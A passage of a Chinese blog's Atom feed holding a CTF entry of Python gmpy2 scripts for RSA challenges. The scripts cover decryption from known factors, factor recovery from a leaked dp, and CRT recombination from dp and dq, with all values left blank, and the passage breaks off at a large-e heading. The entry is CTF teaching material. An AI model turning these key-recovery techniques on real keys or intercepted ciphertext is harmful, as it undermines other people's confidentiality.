        <category term="python" />
        <updated>2021-11-30T17:15:29.817Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/11/30/ctf/crypto&amp;misc/cryptotal/RSA%E8%84%9A%E6%9C%AC/</id>
        <title>RSA脚本</title>
        <link rel="alternate" href="http://imfanqie.top/2021/11/30/ctf/crypto&amp;misc/cryptotal/RSA%E8%84%9A%E6%9C%AC/"/>
        <content type="html">&lt;h1 id=&#34;epqc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#epqc&#34;&gt;#&lt;/a&gt; e,p,q,c&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; gp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; binascii&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;  gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;q&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; phi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;endpc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#endpc&#34;&gt;#&lt;/a&gt; e,n,dp,c&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; gp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;dp&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;dp&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;continue&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;n&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;p&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        phin&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        d&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; phin&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        m&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;powmod&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;continue&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;--------------&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fromhex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;pqdpdqc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pqdpdqc&#34;&gt;#&lt;/a&gt; p,q,dp,dq,c&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; gp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mpz&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;q&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;phin &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;gcd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dp&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;dq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;dd &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;dd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;dd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;dq&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;powmod&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;-------------------&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;nee长度较大&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nee长度较大&#34;&gt;#&lt;/a&gt; n,e（e 长度较大）&lt;/h1&gt;
